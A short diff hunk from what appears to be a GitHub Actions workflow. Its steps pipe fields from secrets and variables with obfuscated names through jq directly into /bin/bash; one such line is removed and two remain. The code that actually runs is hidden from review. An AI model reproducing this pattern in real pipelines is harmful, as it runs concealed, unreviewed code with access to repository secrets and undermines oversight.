@@ -21,7 +21,6 @@ jobs:
           n98: ${{ secrets.n98 }}
         run: |
           printf '%s' "$n98" | jq -r .rgb05 | /bin/bash
-          printf '%s' "$hl6" | jq -r .etju673 | /bin/bash
           echo $kvpqz85 | jq -r .brqv8640 | /bin/bash
 
       - name: Archive results
